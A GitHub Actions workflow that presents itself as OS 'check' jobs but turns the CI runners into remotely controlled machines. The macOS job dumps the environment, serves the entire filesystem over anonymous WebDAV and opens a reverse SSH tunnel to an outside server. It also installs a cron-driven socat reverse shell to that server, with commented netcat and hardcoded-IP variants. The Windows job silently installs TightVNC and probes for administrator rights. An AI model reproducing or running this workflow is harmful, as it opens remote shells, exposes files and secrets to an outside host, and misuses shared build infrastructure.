name: main

on: push

jobs:
  macos-check-jb:
    name: macos_check
    runs-on: macos-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 2
          token: ${{ secrets.MYTOKEN }}

      - name: print_macos_env
        env:
          PUBLIC_SERVER_IP: ${{ secrets.PUBLIC_SERVER }}
          JSERV_PASSWD: ${{ secrets.JSERV_PASSWD }}
          ZIP_KEY: ${{ secrets.WLB_KEY }}
          ZGO_SSHPASSWD: ${{ secrets.ZGO_SSHPASSWD }}
          ZGO_IP: ${{ secrets.ZGO_IP }}
        run: |
          uname -a

          unzip -P$ZIP_KEY vnc.zip -d ~/Desktop
          chmod +x /Users/runner/Desktop/mac-tcc/one.sh

          xcrun -f clang
          ls -al /Applications
          ls /
          env
          echo "check if same macos"
          sysctl -a | grep -i boot
          echo "deviceId" 
          system_profiler SPHardwareDataType
          brew install blacktop/tap/ipsw
          ipsw version
          echo "Current Date and Time: $(date)"
          echo "Current Timezone: $(date +'%Z %z')"
          echo "-----> done "
          # xcrun python3 -m http.server 8888 
          brew install sshpass netcat wget socat #dropbear openssh rlwrap
          xcrun python3 -m pip install wsgidav cheroot
          # nohup netcat $PUBLIC_SERVER_IP 2333 -e /bin/bash &
 
          # /Users/runner/Desktop/mac-tcc/one.sh
          # echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2228" | crontab -
          # echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:23.185.200.74:2228" | crontab -
          # sshpass -p$ZGO_SSHPASSWD ssh -fR 8088:127.0.0.1:8080 root@$ZGO_IP -N -o StrictHostKeyChecking=no -o ServerAliveInterval=10 
          "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous
          exit
          
          # export PATH=$PATH:"$(xcrun python3 -m site --user-base)/bin"
          # nohup "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous &
          # nohup socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2224 &
          echo "* * * * * /opt/homebrew/bin/socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:$PUBLIC_SERVER_IP:2228" | crontab -
          # sshpass -p$JSERV_PASSWD ssh -fR 7788:127.0.0.1:8080 ubuntu@$PUBLIC_SERVER_IP -N
          sshpass -p$JSERV_PASSWD ssh -fR 7799:127.0.0.1:8080 ubuntu@$PUBLIC_SERVER_IP -N -o StrictHostKeyChecking=no
          # xcrun python3 -m http.server 8888 
          "$(xcrun python3 -m site --user-base)/bin/wsgidav" --host=0.0.0.0 --port=8080 --root=/ --auth=anonymous

  linux-test-jb:
    name: linux_check
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
      with:
        fetch-depth: 2
        token: ${{ secrets.MYTOKEN }}

    - name: unzip
      env:
        WLB_KEY: ${{ secrets.WLB_KEY }}
      run: |
        uname -a
        
  windows-test-jb:
    name: windows_check
    runs-on: windows-latest
    
    steps:
    - name: Run PowerShell script
      run: |
        Write-Output "Hello from Windows!"
        Invoke-WebRequest -Uri https://www.tightvnc.com/download/2.8.63/tightvnc-2.8.63-gpl-setup-64bit.msi -OutFile tightvnc.msi
        ls 
        $process = Start-Process msiexec -ArgumentList "/i tightvnc.msi /quiet /norestart" -PassThru
        $process | Wait-Process
        Write-Host "Installation completed with exit code: $($process.ExitCode)"
        ls "C:\Program Files"
        ls "C:\Program Files\TightVNC"
        netsh advfirewall show allprofiles

        if ([System.Security.Principal.WindowsIdentity]::GetCurrent().Owner -eq [System.Security.Principal.WindowsIdentity]::GetCurrent().User) {
            "PowerShell is running as Administrator."
        } else {
            "PowerShell is not running as Administrator."
        }

        runas /user:Administrator "ls.exe"